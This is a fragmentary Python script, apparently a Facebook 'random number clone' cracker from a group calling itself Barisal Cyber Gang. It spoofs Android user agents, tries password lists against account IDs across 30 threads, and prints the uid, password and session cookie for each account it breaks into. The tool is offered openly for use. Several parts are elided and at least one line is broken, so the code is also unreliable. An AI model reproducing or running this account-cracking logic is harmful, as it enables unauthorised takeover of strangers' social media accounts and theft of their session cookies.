...
#Mozilla/5.0 (Linux; Android 13; Redmi Note 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36
    ...
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
os.system('xdg-open https://github.com/RAYHAN-CYBER-05')
...
\x1b[1;96m
                                  ...
                                  \x1b[1;96mB\x1b[1;94mC\033[1;31mG\033[1;32mRAIHAN                                                  
     ...
     \x1b[1;96m Author       : \033[1;32m        RAYHAN AHMED
     \x1b[1;96m Facebook     :  \033[1;32m        RAIHAN PARVEZ
     \x1b[1;96m GitHub       : \033[1;32m         RAYHAN-CYBER-05
     \x1b[1;96m Tool Status  : \033[1;32m  FREE  TOOLS ENJOY
     \x1b[1;96m Team         : \033[1;32m   BARISAL CYBER GANG BCG
...
class Main:
    def __init__(self):
        ...
        os.system("clear")
        print(logo)
        os.system('espeak -a 200 "Welcome BCG  project Random Clone"')
        ...
        print(" [01] RANDOM  NUMBER CLONE \033[1;34m[ULTRA WORKING Tested By IHRA]")
        print(" [02] MY fACEBOOK ACCOUNT  \033[1;35m[RAYHAN PARVEZ] ")
        print(" [00] Exit")
        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═DCCS-TEAM═\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")
        BCG =input(" [?] Choose : ")
        os.system(dg-open ')
...
def num():
    ...
    with ThreadPool(max_workers=30) as noob:
        os.system('clear')
        print(logo)
        os.system('espeak -a 200 "Random cloning Started BCG"')
        tl = str(len(user))
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mBCG\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f"\033[38;5;46m[BCG-OK💚] {uid} | {ps}")
                print(f" Cookie : {coki}")
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[BCG-CP🔪] {uid}|{ps}")
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[BCG_KING🔥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()